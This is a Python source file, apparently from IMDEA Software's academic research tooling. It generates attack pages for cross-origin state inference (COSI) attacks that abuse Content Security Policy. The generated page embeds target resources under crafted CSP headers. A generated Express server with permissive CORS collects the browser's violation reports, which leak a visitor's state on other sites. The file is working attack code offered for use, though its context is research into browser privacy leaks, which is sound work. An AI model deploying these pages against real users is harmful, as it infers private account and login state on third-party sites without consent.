# -*- coding: utf-8 -*-

"""
	Copyright (C) 2019  Soheil Khodayari, IMDEA Software
	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU Affero General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.
	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU Affero General Public License for more details.
	You should have received a copy of the GNU Affero General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	Description:
	---------------
	Attack Page Generator Class for CSP

"""


# ----------------------------------------------------------------------- #
#                  CSP Attack Page Generator Class
# ----------------------------------------------------------------------- #

import json

class CSPAttackPageGenerator(object):
    """
        a pluggable HTML attack page generator class for COSI attacks
    """
    def __init__(self, uuid, ef_apg, **kwargs):
        self._uuid = uuid 
        for key in kwargs:
            setattr(self, key, kwargs[key])

        self._ef_apg = ef_apg  # re-use the same EF methods

    def __unicode__(self):
        return 'CSP-APG ID-%s'%str(self._uuid)

    def __str__(self):
        return 'CSP-APG ID-%s'%str(self._uuid)

    def __repr__(self):
        return 'CSP-APG ID-%s'%str(self._uuid)

    def _getEFInstance(self):
        return self._ef_apg

    # ----------------------------------------------------------------------- #
    #                   Common Public Methods
    # ----------------------------------------------------------------------- #

    def getID(self):
        return self._uuid

    def _get_port_and_path_uri(self, s):
        part = s[s.rindex(":")+1:]
        idx = part.index("/")
        port = part[:idx]
        path = part[idx:]
        return port, path

    def _get_csp_header(self, tag_name, target_url, report_uri):
        if tag_name == "iframe" or tag_name == "frame":
            return "frame-src '%s' %s ; frame-ancestors '%s' %s"%('self', target_url, 'self', target_url)
        elif tag_name == "object":
            return "object-src '%s' %s"%('self', target_url)
        elif tag_name == "img":
            return "img-src '%s' %s"%('self', target_url)
        elif tag_name == "audio" or tag_name == "video":
            return "media-src '%s' %s"%('self',target_url)
        elif tag_name == "link":
            return "style-src '%s' %s"%('self',target_url)
        elif tag_name == "embed":
            return "child-src '%s' %s ; frame-ancestors '%s' %s"%('self', target_url, 'self', target_url)
        elif tag_name == "script":
            jquery_url = "https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"
            return "script-src 'unsafe-inline' '%s' %s %s"%('self', jquery_url, target_url)
        elif tag_name == "applet":
            return "frame-ancestors '%s' %s ; object-src '%s' %s"%('self', target_url, 'self', target_url)
        else:
            return ""

    # def get_csp_headers(self, target_url, report_uri):
    #     headers = []
    #     tags = ["iframe", "frame", "object", "img", "audio", "video", "link", "embed", "script", "applet"]
    #     for tag in tags:
    #         header = self._get_csp_header(tag, target_url, report_uri)
    #         headers.append(header)
    #     return headers 

    def _get_csp_headers(self, headers, tag, target_url, report_uri):
        out = headers
        reportURIElement = "report-uri %s"%report_uri

        if len(headers):
            for i in range(len(out)):
                hdr = out[i]
                tagStartIndex = hdr.find(tag)
                if tagStartIndex != -1:
                    tagIndex = tagStartIndex + len(tag)
                    newHdr = hdr[:tagIndex+1] + " " + target_url + hdr[tagIndex:]
                    out[i] = newHdr
                    return out

            newHdr = self._get_csp_header(tag, target_url, report_uri)
            out.append(newHdr) 
        else:
            newHdr = self._get_csp_header(tag, target_url, report_uri)
            out.append(newHdr)

        if reportURIElement in out:
            out.remove(reportURIElement)
        out.append(reportURIElement)
        return out

    def _attach_csp_html_tag(self, html, target_url, tag_name, tag_uuid):
        moduleHelper = self._getEFInstance()
        attribute = moduleHelper._get_tag_corresponding_attribute(tag_name)
        js = '''
        <script type="text/javascript">
            var tag = document.createElement("%s")
            tag.setAttribute("%s", "%s")
            document.body.appendChild(tag);
            window.tag%s = tag;
        </script>
        '''%(tag_name, attribute, target_url, tag_uuid)
        if tag_name == "frame":
            returnHTML = moduleHelper._include_tag_in_head(html, js)
        else:
            returnHTML = moduleHelper._include_tag_in_body(html, js)
        return returnHTML

    def _attach_csp_log_sender(self, html, tag, report_uri, ks_lookup):
        moduleHelper = self._getEFInstance()
        js = '''
            <script type="text/javascript">
            var postCSPDefault = function(){
                var logMessage = {
                    "csp-report": {"blocked-uri": "NO_VIOLATION"},
                    "ks_lookup": JSON.stringify(%s),
                }
                request = $.ajax({
                    url: "%s",
                    contentType: "application/json; charset=utf-8",
                    type: "post",
                    data: JSON.stringify(logMessage),
                    dataType: 'text',
                    crossDomain: true,
                });

   
             }
            setTimeout(function() {
                    postCSPDefault();
                }, 1000);
            </script>
        '''%(ks_lookup, report_uri)

        if tag == "frame":
            returnHTML = moduleHelper._include_tag_in_head(html, js)
        else:
            returnHTML = moduleHelper._include_tag_in_body(html, js)
        return returnHTML

    def _generate_node_server_code(self, html, csp_headers, path="/record-data/csp/", port="3000"):
        js = '''
        const express = require('express')
        var bodyParser = require('body-parser');
        const app = express()
        const path = require('path');
        const port = %s;
        // parse application/x-www-form-urlencoded
        app.use(bodyParser.urlencoded({ extended: false }))
        // parse application/json
        app.use(bodyParser.json())
        app.use(bodyParser.json({type: 'application/json'}));
        app.use(bodyParser.json({type: 'application/csp-report'}));

        var memory = {'ks': { }, 'violations': []};


        // -----------------------------------------------------------//
        //  @TODO:  replacce with your own configuration
        // -----------------------------------------------------------//

        // html attack page name
        // const html_file_name = 'chromecsp.html';

        // routes
        const endpoint_path = '/';
        const report_uri = '%s'
        const see_state = '/get-state/csp/'
        const reset_memory = '/reset/csp/'
        // -----------------------------------------------------------//

        // allow CORS on this server
        app.all('/*', function(req, res, next) {
          res.header("Access-Control-Allow-Origin", "*");
          res.header("Access-Control-Allow-Headers", "*");
          res.header('Access-Control-Allow-Credentials', 'true');    
          res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
          next();
        });

        app.get(endpoint_path, (req, res) => {
            var csp_header = `%s`;
            var html = `%s`;
            res.setHeader("Content-Security-Policy", csp_header);
            //return res.sendFile(path.join(__dirname+'/'+ html_file_name));
            return res.send(html);
        });

        app.post(report_uri, (req, res) => {
            if(req.body.ks_lookup != undefined){
                // message sent from attack-page
                memory['ks'] = JSON.parse(req.body.ks_lookup);
                return res.send({"message":"KS saved!"}).end();
            }else{
                // violation posted by browser
                console.log(req.body);
                var violationURL = req.body["csp-report"]["blocked-uri"];
                console.log(violationURL);
                memory.violations.push(violationURL);
                return res.send({"message":"violation recieved!"}).end();
            }
        });

        app.get(see_state, (req, res) => {

            return res.send(JSON.stringify(memory)).end();
        });

        app.get(reset_memory, (req, res) => {
            memory = {'ks': { }, 'violations': []};
            return res.send({"message":"temporary storage restarted"}).end();
        });



        app.listen(port, () => console.log(`Example app listening on port ${port}!`))
        '''%(port, path, csp_headers, html)
        return js

    def get_csp_attack_page_multiple_inclusion_and_headers(self, ks, report_uri):
        document_title = "CSP_Page"
        _ef_apg_instance = self._ef_apg

        ks_include = ks["IncludeME"]
        csp_ks_lookup = ks["CSP"]["LookupME"]
        idx = 0
        ks_csp_lookup_string = _ef_apg_instance._convert_dict_to_string(csp_ks_lookup)
        html = _ef_apg_instance._get_base_dom_document(document_title)    
        # html = self._attack_op_console_state_printer(html)  

        headers = []
        for inclusion_url in ks_include:
            tags = ks_include[inclusion_url]
            for tag in tags:
                headers = self._get_csp_headers(headers, tag, inclusion_url, report_uri)
                idx = idx + 1
                tag_uuid = idx
                html = self._attach_csp_html_tag(html, inclusion_url, tag, tag_uuid) 
                html = self._attach_csp_log_sender(html, tag, report_uri, ks_csp_lookup_string) #

        port, path = self._get_port_and_path_uri(report_uri)
        httpHeaders = " ; ".join(headers)
        node_server_string = self._generate_node_server_code(html, httpHeaders, path=path, port=port)
        return html, headers, node_server_string